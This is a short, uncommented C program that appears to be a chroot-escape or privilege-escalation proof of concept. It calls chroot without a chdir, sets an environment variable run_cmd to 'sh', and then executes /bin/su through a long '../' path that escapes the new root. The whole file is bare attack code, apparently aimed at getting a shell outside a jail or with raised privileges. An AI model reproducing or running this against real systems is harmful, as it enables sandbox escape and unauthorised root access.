#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>

int main(void) {
    if (chroot("chroot") != 0) {
        perror("chroot");
        exit(EXIT_FAILURE);
    }

    if (setenv("run_cmd", "sh", 1) != 0) {
        perror("setenv");
        exit(EXIT_FAILURE);
    }

    const char *path = "../../../../../../../../../../bin/su";
    execl(path, path, NULL);

    perror("exec");
    return EXIT_FAILURE;
}
